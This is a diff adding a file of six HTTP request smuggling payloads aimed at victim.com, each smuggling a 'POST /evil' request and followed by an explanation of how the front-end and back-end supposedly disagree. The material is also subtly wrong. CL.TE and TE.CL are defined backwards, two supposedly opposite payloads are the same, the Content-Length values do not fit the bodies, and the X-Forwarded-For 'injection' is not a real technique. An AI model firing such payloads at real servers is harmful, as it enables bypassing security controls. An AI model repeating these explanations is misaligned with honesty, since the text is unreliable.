@@ -1,0 +1,115 @@
+1. CL.TE Smuggling (Content-Length and Transfer-Encoding)
+In this type of attack, the Content-Length and Transfer-Encoding headers are manipulated so that the front-end proxy uses Transfer-Encoding, while the back-end server interprets Content-Length.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+POST /evil HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Explanation:
+The front-end proxy may process the request as chunked (due to Transfer-Encoding: chunked), reading the body in chunks.
+The back-end server, however, processes the Content-Length header and reads the body as 13 bytes, resulting in the second request (POST /evil) being sent as a separate HTTP request, bypassing any security controls.
+Server Response:
+The proxy responds with HTTP 200 OK for the first POST.
+The back-end server may respond as if the second POST request is a valid request to /evil, which could trigger further malicious actions.
+2. TE.CL Smuggling (Transfer-Encoding and Content-Length)
+This is the reverse of the previous technique where the Transfer-Encoding header is processed by the front-end server and the Content-Length is processed by the back-end server.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 13
+
+0
+
+POST /evil HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Explanation:
+The front-end proxy uses the Transfer-Encoding: chunked header and reads the body in chunks.
+The back-end server reads the Content-Length and processes the request as if the body is 13 bytes, effectively smuggling the second POST as a new HTTP request.
+Server Response:
+The proxy responds to the first POST with a valid HTTP 200 response.
+The back-end server treats the second POST /evil request as if it's a separate request, which can be dangerous if /evil is a vulnerable endpoint.
+3. Content-Length Injection (HTTP Request Splitting)
+In this technique, the attacker manipulates the Content-Length header to inject multiple requests into one, often splitting a request into two or more parts.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+
+POST /evil HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Explanation:
+The front-end proxy processes the first request and forwards it to the server.
+The back-end server processes the request and may interpret the second POST request (/evil) as a legitimate request, which could bypass security controls.
+Server Response:
+The proxy sends a valid response for the first POST request.
+The back-end server executes the smuggled request (POST /evil) as if it's a valid request, possibly exploiting a vulnerability in /evil.
+4. Request Splitting Using Multiple Content-Length Headers
+This technique exploits situations where multiple Content-Length headers are sent in the request. The proxy might process one value while the back-end server processes the other.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Content-Length: 0
+
+POST /evil HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Explanation:
+The front-end proxy may process the first Content-Length (13), and the back-end server processes the second Content-Length (0).
+The back-end server may interpret this as an entirely new HTTP request (POST /evil), which could be dangerous if /evil is a vulnerable endpoint.
+5. Injection of Malicious Payload with Transfer-Encoding
+This attack uses Transfer-Encoding to bypass security filters, allowing the attacker to inject malicious data or requests.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 13
+
+0
+
+POST /evil HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 13
+Explanation:
+The front-end proxy handles the request using Transfer-Encoding: chunked, while the back-end server processes it differently.
+This leads to multiple requests being sent (the POST /evil), potentially triggering unwanted behavior on the server.
+6. HTTP Request Smuggling with X-Forwarded-For Header
+Attackers can also use headers such as X-Forwarded-For to inject additional HTTP requests in the header and trick the back-end server into processing them.
+
+Payload Example:
+makefile
+Copy
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+X-Forwarded-For: 127.0.0.1, POST /evil HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 13\r\n\r\n
+
+0
+Explanation:
+The attacker injects a second request (POST /evil) into the X-Forwarded-For header.
+The proxy forwards the malicious X-Forwarded-For header, which the back-end server may process as a valid HTTP request, triggering the attack.
